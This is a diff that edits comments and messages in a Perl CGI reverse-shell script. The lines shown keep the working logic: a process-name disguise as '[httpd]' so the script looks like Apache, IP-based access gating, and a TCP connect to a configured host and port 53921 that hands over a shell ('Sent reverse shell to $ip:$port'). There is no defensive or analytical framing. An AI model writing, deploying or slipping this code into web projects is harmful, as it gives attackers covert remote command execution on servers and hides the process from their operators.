@@ -1,4 +1,4 @@
-';                            
+';
 my $port = 53921;
 
 # Options
@@ -11,9 +11,10 @@ my $authorised_client_pattern = qr(^127\.0\.0\.1$);
 my $global_page = "";
 my $fake_process_name = "/usr/sbin/apache";
 
-# Change the process name to be less conspicious :P
+# Change the process name to be less conspicious
 $0 = "[httpd]";
 
+# Authenticate based on source IP address if required
 if (defined($ENV{'REMOTE_ADDR'})) {
         cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");
 
@@ -24,7 +25,7 @@ if (defined($ENV{'REMOTE_ADDR'})) {
                 }
         }
 } elsif ($auth) {
-        cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denyin$
+        cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP.");
         cgiexit(0);
 }
 
@@ -40,7 +41,7 @@ if ($pid) {
         umask(0);
 }
 
-# connect
+# Make TCP connection for reverse shell
 socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
 if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
         cgiprint("Sent reverse shell to $ip:$port");
